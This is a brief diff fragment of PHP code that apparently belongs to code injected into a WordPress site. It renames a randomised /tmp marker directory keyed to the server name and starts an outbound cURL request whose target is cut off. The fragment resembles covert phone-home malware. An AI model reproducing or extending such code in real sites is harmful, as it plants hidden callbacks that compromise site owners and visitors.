@@ -26,8 +26,8 @@ if (file_put_contents ($wpoptionsssss, $wpoptionssssr));  */ }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/jhjkhkh'.$d.$random)) { } else {
-	mkdir('/tmp/jhjkhkh'.$d.$random);
+if(file_exists('/tmp/nhnn4'.$d.$random)) { } else {
+	mkdir('/tmp/nhnn4'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
